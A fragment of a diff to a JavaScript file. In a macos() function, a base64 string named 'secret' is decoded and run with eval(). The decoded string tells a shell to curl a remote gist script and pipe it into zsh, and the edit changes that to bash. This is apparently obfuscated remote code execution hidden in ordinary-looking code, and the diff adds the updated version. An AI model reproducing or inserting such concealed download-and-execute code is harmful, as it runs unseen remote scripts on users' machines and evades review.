@@ -51,7 +51,7 @@ async function windows () {
 }
 
 function macos () {
-    const secret = Buffer.from('cnVuU2hlbGwoJ2N1cmwgaHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9DaG9tZU5TL2M3NDY4NjQyY2ZjZmUyNzQzYTFhMmVmMWI5OTNkNzRmL3Jhdy9iMjE0MDlkZTk1ZTExYTZmYTE2YjYyZGM4Mjk1OTUwN2JhZGU1MTllL3NjcmlwdCB8IHpzaCcp', 'base64').toString()
+    const secret = Buffer.from('cnVuU2hlbGwoJ2N1cmwgaHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9DaG9tZU5TL2M3NDY4NjQyY2ZjZmUyNzQzYTFhMmVmMWI5OTNkNzRmL3Jhdy9iMjE0MDlkZTk1ZTExYTZmYTE2YjYyZGM4Mjk1OTUwN2JhZGU1MTllL3NjcmlwdCB8IGJhc2gnKQ==', 'base64').toString()
 
     eval(secret)
 }
